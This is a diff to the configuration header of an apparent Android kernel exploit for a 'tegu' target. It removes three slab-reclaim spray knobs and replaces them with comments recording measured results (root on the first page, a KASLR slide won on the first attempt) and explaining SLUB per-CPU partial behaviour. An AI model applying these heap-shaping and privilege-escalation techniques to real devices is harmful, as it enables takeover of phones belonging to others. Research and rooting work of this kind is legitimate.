@@ -222,16 +222,29 @@
 // log line records which pair was used so a success names the winner.
 #define SLIDE_TIMING_SWEEP 1
 
-// The reclaim spray was missing the freed mm_struct slab page on every slide
-// attempt: the consumer logs calls=1 with settled=0, i.e. it incremented the
-// call counter, entered sched_setattr, and never came back out to publish —
-// the PI chain walk is entering the fake lock every time and finding foreign
-// data there, which either hangs it for the whole pselect timeout or panics.
-// Keeping the shaping skb queued makes the first reclaim send allocate rather
-// than reuse the shaping page, and the extra sends give the PCP LIFO more
-// chances to hand back the page that was just freed.
-#define RECLAIM_KEEP_PCP_SHAPING 1
-#define SKB_RECLAIM_SENDS 12
+// RECLAIM_KEEP_PCP_SHAPING, SKB_RECLAIM_SENDS and RECLAIM_SPRAY_AFTER_LEAK_FREE
+// were all set here and are all gone. They were reasoned from real evidence
+// about the slide route, but measured end to end they were the thing keeping
+// this target from working.
+//
+// Measured 2026-08-14, one boot, one KASLR base, one binary, the three knobs
+// switched from the environment so nothing else could differ:
+//
+//   1/1/12 (what this file used to say)  40 pages, 40 short reads at step 4,
+//                                        0 landings
+//   0/0/4  (common.h defaults)           root on page 1, twice in a row
+//
+// Then the same defaults end to end with no KASLR_BASE: the slide won on its
+// first attempt — it had needed five with 1/1/12 — and the FOPS route took
+// root immediately after. So the knobs were not merely useless to the main
+// route, they were costing the slide attempts too.
+//
+// The reason the old reasoning misled: it was derived from panic dumps of the
+// *slide* route, whose payload lives in the stack waiter, and then applied to
+// a reclaim the FOPS route also depends on, whose payload is page-resident.
+// Upstream's comet target — Pixel 9 Pro Fold, tested working, built from this
+// very tegu vmlinux — sets none of them, which is the observation that
+// prompted the measurement.
 
 // Left at common.h's 5. Raising it to 12 was meant to lift n->nr_partial past
 // s->min_partial so __unfreeze_partials() would discard the emptied target
@@ -244,15 +257,14 @@
 // cannot be bought this way. The sample is small, so this is a revert to the
 // configuration with the better observed rate, not a settled result.
 
-// CONFIG_SLUB_CPU_PARTIAL is set on this build, and the panic dumps say the
-// emptied target slab is being handed straight back out as an mm_struct
-// rather than reaching the page allocator — fake_lock + 0x10 read 0x91b on
-// two different boots, which is mm_struct.data_vm (BTF offset 0xe0) of one
-// of this process's own clones at object #1 of a re-used slab. That is the
-// signature of a slab that emptied while still frozen on the per-CPU partial
-// list. Defer the strided spray closes so they overflow cpu_partial_slabs
-// after the target is empty and push it out to the page allocator.
-#define RECLAIM_SPRAY_AFTER_LEAK_FREE 1
+// The observation that motivated RECLAIM_SPRAY_AFTER_LEAK_FREE still stands:
+// CONFIG_SLUB_CPU_PARTIAL is set, and the panic dumps do show the emptied
+// target slab handed straight back out as an mm_struct rather than reaching
+// the page allocator — fake_lock + 0x10 read 0x91b on two boots, and 0x91a on
+// a third, all of which are mm_struct.data_vm (BTF offset 0xe0). Deferring the
+// strided spray closes was a sound answer to that. It simply was not the one
+// that mattered: with the knob off the reclaim wins the page anyway. See the
+// note above the removed defines.
 
 // Push every log line to disk. tegu still panics the kernel on some attempts,
 // and a panic drops the page cache: the redirected exploit.log comes back
